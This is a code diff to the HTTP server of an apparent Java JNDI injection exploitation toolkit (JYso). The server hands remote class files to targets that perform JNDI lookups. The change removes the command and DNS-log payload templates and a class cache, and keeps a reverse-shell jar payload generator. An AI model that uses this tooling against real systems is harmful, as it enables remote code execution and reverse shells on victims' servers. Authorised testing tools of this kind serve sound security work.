@@ -2,10 +2,7 @@ package com.qi4l.JYso;
 
 import cn.hutool.core.io.file.FileReader;
 import com.qi4l.JYso.gadgets.Config.Config;
-import com.qi4l.JYso.gadgets.utils.Cache;
 import com.qi4l.JYso.gadgets.utils.Utils;
-import com.qi4l.JYso.template.CommandTemplate;
-import com.qi4l.JYso.template.DnslogTemplate;
 import com.qi4l.JYso.template.ReverseShellTemplate;
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
@@ -438,32 +435,26 @@ public class HTTPServer {
         String path = exchange.getRequestURI().getPath();
         String className = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
         System.out.println(ansi().render("@|green [+] Receive ClassRequest: |@" + className + ".class"));
-        if (Cache.contains(className)) {
-            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
 
-            byte[] bytes = Cache.get(className);
-            exchange.sendResponseHeaders(200, bytes.length);
-            exchange.getResponseBody().write(bytes);
-        } else {
-            String pa = cwd + path;
-            File file = new File(pa);
+        String pa = cwd + path;
+        File file = new File(pa);
 
-            if (file.exists()) {
-                byte[] bytes = new byte[(int) file.length()];
-                try (FileInputStream fileInputStream = new FileInputStream(file)) {
-                    fileInputStream.read(bytes);
-                }
-                exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
-                exchange.sendResponseHeaders(200, file.length());
-                exchange.getResponseBody().write(bytes);
-
-                System.out.println(ansi().render("@|green [+] 远程类加载成功 |@" + 200));
-                System.out.println("-------------------------------------- JNDI Remote Refenrence Links --------------------------------------");
-            } else {
-                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
-                exchange.sendResponseHeaders(404, 0);
+        if (file.exists()) {
+            byte[] bytes = new byte[(int) file.length()];
+            try (FileInputStream fileInputStream = new FileInputStream(file)) {
+                fileInputStream.read(bytes);
             }
+            exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
+            exchange.sendResponseHeaders(200, file.length());
+            exchange.getResponseBody().write(bytes);
+
+            System.out.println(ansi().render("@|green [+] 远程类加载成功 |@" + 200));
+            System.out.println("-------------------------------------- JNDI Remote Refenrence Links --------------------------------------");
+        } else {
+            System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
+            exchange.sendResponseHeaders(404, 0);
         }
+
         exchange.close();
     }
 
@@ -556,24 +547,11 @@ public class HTTPServer {
         return params;
     }
 
-    /*
-         由于我本地安装的 Websphere 在加载本地 classpath 这一步复现不成功
-         这里不确定 websphere 这种方式在多次操作时 Class 文件名相同时是否会存在问题
-         目前暂时认为其不会有问题，如果有问题，后面再修改
-    */
     private static String createJar(String type, String... params) throws Exception {
         byte[] bytes;
         String className = "xExportObject";
 
         switch (type.toLowerCase()) {
-            case "command":
-                CommandTemplate commandTemplate = new CommandTemplate(params[0], "xExportObject");
-                bytes = commandTemplate.getBytes();
-                break;
-            case "dnslog":
-                DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0], "xExportObject");
-                bytes = dnslogTemplate.getBytes();
-                break;
             case "reverseshell":
                 ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(params[0], params[1], "xExportObject");
                 bytes = reverseShellTemplate.getBytes();
@@ -598,9 +576,6 @@ public class HTTPServer {
         jarOut.close();
         bout.close();
 
-        String jarName = Utils.getRandomString();
-        Cache.set(jarName, bout.toByteArray());
-
-        return jarName;
+        return Utils.getRandomString();
     }
 }
